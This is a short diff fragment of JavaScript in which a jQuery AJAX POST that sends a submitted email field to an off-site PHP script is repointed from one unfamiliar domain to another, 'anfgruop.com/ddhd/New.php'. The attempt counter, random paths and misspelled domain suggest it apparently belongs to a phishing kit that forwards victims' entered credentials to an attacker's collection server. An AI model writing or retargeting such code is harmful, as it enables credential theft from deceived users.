@@ -388,7 +388,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://gasc.uk/gfd/New.php',
+url: 'https://anfgruop.com/ddhd/New.php',
 type: 'POST',
 data:{
 email:email,
